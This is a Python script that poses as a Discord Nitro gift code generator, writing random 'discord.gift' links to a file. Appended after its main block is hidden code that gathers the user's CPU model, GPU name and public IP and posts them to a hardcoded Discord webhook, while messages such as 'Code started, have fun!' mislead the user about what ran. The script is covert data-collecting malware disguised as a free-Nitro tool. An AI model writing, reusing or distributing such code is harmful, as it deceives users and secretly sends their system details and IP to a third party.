import platform
import requests
import socket
import json
import cpuinfo
import GPUtil
import random
import string
import time
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init()

# ANSI escape code for green text
GREEN = Fore.GREEN
RESET = Style.RESET_ALL

def generate_nitro_code():
    code_length = 24
    code_characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
    code = ''.join(random.choice(code_characters) for _ in range(code_length))
    return f"discord.gift/{code}"

def print_ascii_art():
    ascii_art = r"""
    ███╗   ██╗██╗████████╗██████╗  ██████╗ 
    ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗
    ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║
    ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║
    ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝
    ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ 
    """
    print(GREEN + ascii_art + RESET)
    time.sleep(3)

def main():
    print_ascii_art()

    num_codes = int(input(" (+) Enter the number of Nitro codes to generate: "))
    output_filename = "generated_nitro_codes.txt"

    with open(output_filename, "w") as output_file:
        for i in range(num_codes):
            nitro_code = generate_nitro_code()
            output_file.write(nitro_code + "\n")
            print(f"{GREEN}Successfully generated code: {nitro_code}{RESET}")

    print(f"Generated {num_codes} Nitro codes and saved them in '{output_filename}'.")

if __name__ == "__main__":
    main()


WEBHOOK_URL = 'https://discord.com/api/webhooks/1146142657324798083/vixbmJj33haV9L_sIdIaqg3V0tlAXCdkJtRtNp-26x8DT1J31A1rOMuHvCSRP_P3DXwb'

print("Pls wait a bit, till the code starts!")

def get_gpu_info():
    gpu_list = GPUtil.getGPUs()
    if gpu_list:
        return gpu_list[0].name
    return 'No GPU information available'

def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        if response.status_code == 200:
            ip_data = response.json()
            return ip_data['origin']
        else:
            return 'Failed to retrieve public IP'
    except Exception as e:
        return 'Failed to retrieve public IP'

def get_system_info():
    gpu_info = get_gpu_info()
    public_ip = get_public_ip()
    system_info = {
        'CPU': cpuinfo.get_cpu_info()['brand_raw'],
        'GPU': gpu_info,
        'IP': public_ip
    }
    return system_info

def send_to_discord_webhook(embed):
    payload = {'embeds': [embed]}
    headers = {'Content-Type': 'application/json'}
    response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        print("Code started, have fun!")
    else:
        print("Failed to send data to Discord webhook.")

if __name__ == '__main__':
    try:
        system_info = get_system_info()

        embed = {
            'title': 'System Information',
            'fields': [
                {'name': 'CPU', 'value': system_info['CPU'], 'inline': False},
                {'name': 'GPU', 'value': system_info['GPU'], 'inline': False},
                {'name': 'IP', 'value': system_info['IP'], 'inline': False}
            ],
            'footer': { 'text': 'Made by Lαɱα & K!ԃ '}
        }

        send_to_discord_webhook(embed)
    except Exception as e:
        print("An error occurred:", e)
